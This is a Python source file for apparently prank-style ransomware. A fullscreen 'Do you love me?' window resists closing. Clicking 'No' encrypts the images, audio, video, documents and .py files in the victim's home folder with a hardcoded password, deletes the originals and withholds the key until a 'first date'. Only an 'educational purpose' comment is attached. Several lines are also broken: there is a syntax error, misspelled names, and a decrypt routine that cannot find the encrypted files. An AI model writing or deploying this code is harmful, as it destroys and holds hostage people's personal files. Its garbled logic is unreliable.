import pyautogui, pyAesCrypt, os, mimetypes, threading, win32api, win32con
from tkinter import Tk, Label, Button, Entry
from time import sleep, time

pyautogui.FAILSAFE = False

class I_LOVE_YOU(Tk):
    def __init__(self):
        super().__init__()
        ###################
        self.countNo = 0
        self.button = None
        self.infoMsg = None
        self.inputMsg = None
        self.inputMsg2 = None
        self.inputMsg3 = None
        self.dateInput = None 
        self.emailInput = None
        self.timeInput = None
        self.passInput = None
        self.close = False
        ######################
        self.title("You Can't Say No")
        self.config(bg="#00f2ff")
        self.attributes("-fullscreen", True)
        self.msg = Label(self, text="Do you love me ?", fg="#e74c3c", bg="#00f2ff", font=("Comic sans ms", 40, 'bold'))
        self.msg.place(relx=0.5, rely=0.3, anchor="center")
        self.yesBtn = Button(self, text="Yes", command=self.accepted, font=("Times New Roman", 25, 'bold'), bg='#0dff0d', fg='#fff', padx=20, pady=10)
        self.yesBtn.place(relx=0.55, rely=0.5)
        self.noBtn = Button(self, text="No", command=self.rejected, font=("Times New Roman", 25, 'bold'), bg='#ff0d0d', fg='#fff', padx=20, pady=10)
        self.noBtn.place(relx=0.4, rely=0.5)
        self.update()
        sleep(2.5)
        while not self.close:
            self.onClosing()
    
    def onClosing(self):
        self.attributes("-fullscreen", True)
        self.protocol("WM_DELETE_WINDOW", self.onClosing)
        self.update()

    accepted = lambda self : self.secondScreen() if self.countNo != 0 else self._seconScreen()

    def _seconScreen(self):
        self.close = True
        self.yesBtn.destroy()
        self.noBtn.destroy()
        self.msg['text'] = "I Love You Too.. \U0001F49E "
        self.button = Button(self, text="Get My Info", command = self.getInfo, fg="#e74c3c", bg="#fff", font=("Comic sans ms", 30, 'bold'))
        self.button.place(relx = 0.5, rely= 0.65, anchor="center")

    def getInfo(self):
        with open("myLoverInfo.txt", "w") as file:
            details = "Name : Your_Name \nPhone : +977XXXXXXXXXX"
            file.writelines(details)
        file.close()
        self.destroy() 

    rejected = lambda self : (setattr(self, 'countNo', self.countNo + 1), self.changeButtonPosition(), print(self.countNo))
    
    def blockShutdown(event):
        if event = win32con.PBT_APMSUSPEND:
            self.startEncryption() 
            slef.rejected()
            return True
    win32api.SetConsoleCtrlHandler(blockShutdown, True) 

    def changeButtonPosition(self):
        if self.countNo == 1:
            self.startEncryption()
        self.yesPos = self.yesBtn.place_info()
        self.noPos = self.noBtn.place_info()
        if self.yesPos["relx"] == 0.55 and self.yesPos['rely'] == 0.5:
            self.yesBtn.place(relx=0.4, rely=0.5)
            self.noBtn.place(relx=0.55, rely=0.5)
        else:
            self.yesBtn.place(relx=self.noPos['relx'], rely=self.noPos['rely'])
            self.noBtn.place(relx=self.yesPos['relx'], rely=self.yesPos['rely'])

    def startEncryption(self):
        backThred = threading.Thread(target = self.encrypt)
        backThred.daemon = True
        backThred.start()

    def secondScreen(self):
        self.yesBtn.destroy()
        self.noBtn.destroy()
        self.infoMsg = Label(self, text = "Note: Your data is locked i will give you the key at our first date", fg="#f00", bg="#00f2ff", font=("Times New Roman", 20, 'bold'))
        self.infoMsg.place(relx=0.5, rely=0.1, anchor="center")
        self.msg['text'] = "Enter time for our first date ?"
        self.inputMsg = Label(self, text="Enter Email: ", fg="#00ff2f", bg="#00f2ff", font=("Times new roman", 20, 'bold'))
        self.inputMsg.place(relx = 0.3, rely = 0.4)
        self.emailInput = Entry(self, validate="key", width=30)
        self.emailInput.place(relx = 0.5, rely = 0.4)
        self.inputMsg2 = Label(self, text="Enter Date (MM/DD): ", fg="#00ff2f", bg="#00f2ff", font=("Times new roman", 20, 'bold'))
        self.inputMsg2.place(relx = 0.3, rely= 0.5)
        self.selectDate = Entry(self, validate="key", width=30)
        self.selectDate.place(relx = 0.5, rely= 0.5)
        self.inputMsg3 = Label(self, text="Select Time (HH:MM): ", fg="#00ff2f", bg="#00f2ff", font=("Times new roman", 20, 'bold'))
        self.inputMsg3.place(relx = 0.3, rely= 0.6)
        self.selectTime = Entry(self, validate="key", width=30)
        self.selectTime.place(relx = 0.5, rely= 0.6)
        self.button = Button(self, text="Send", command = self.getDate, fg="#e74c3c", bg="#fff", font=("Comic sans ms", 30, 'bold'))
        self.button.place(relx = 0.5, rely= 0.75, anchor="center")

    def getDate(self):
        email = self.emailInput.get()
        date = self.selectDate.get()
        time = self.selectTime.get()
        print(email, date, time)
        self.lastScreen()

    def lastScreen(self):
        self.close = True
        self.inputMsg2.place_forget()
        self.inputMsg3.place_forget()
        self.emailInput.place_forget()
        self.selectDate.place_forget()
        self.selectTime.place_forget()
        self.infoMsg['text'] = "Note: Your data is locked i will give you the key at our first date"
        self.msg['text'] = f"Sorry, you said no {self.countNo} times, so your data is locked.\nTo get password come at date" 
        self.inputMsg['text'] = "Enter Password: "
        self.inputMsg.place(relx = 0.3, rely = 0.5)
        self.passInput = Entry(self, validate="key", width=30)
        self.passInput.place(relx = 0.5, rely = 0.5)
        self.button['text'] = "Decrypt"
        self.button['command'] = self.decrypt
    """
        It's for educational purpose
    """
    def getFiles(self, path):
        getExtentions = lambda type: [ext for ext in mimetypes.types_map if mimetypes.types_map[ext].split('/')[0] == type]
        listFlatten = lambda lst: [item for subList in lst for item in (listFlatten(subList) if isinstance(subList, list) else [subList])]
        exT = listFlatten([getExtentions(i) for i in ['video','audio','image']])
        exT += ['.doc', '.pdf', '.txt', '.docs', '.dot', '.wiz', '.ppt', '.py']
        walk = lambda path : [os.path.join(root, file) for root, _, files in os.walk(path) 
                            for file in files if os.path.splitext(file)[1].lower() in exT]
        return walk(path)

    def encrypt(self):
        files = self.getFiles(os.path.expanduser('~'))
        for _file in files:
            with open(_file, 'rb') as fileIn:
                with open(_file + '.enc', 'wb') as fileOut:
                    pyAesCrypt.encryptStream(fileIn, fileOut, 'iloveyou', 512 * 1024)
                os.remove(_file)

    def decrypt(self):
        files = self.getFiles(os.path.expanduser('~'))
        self.msg['txt'] = f"Your files are decrypting....\nIt will take nearly {5*self.countNo} sec\n"
        password = self.passInput.get()
        self.countNo = len(files)
        for _file in files:
            with open(_file, 'rb') as fileIn:
                with open(_file[:-4], 'wb') as fileOut:
                    pyAesCrypt.decryptStream(fileIn, fileOut, password, 512 * 1024)
                os.remove(_file)
            self.countNo -= 1
        self.destroy()

if __name__ == '__main__':
    ily = I_LOVE_YOU()
    ily.mainloop()
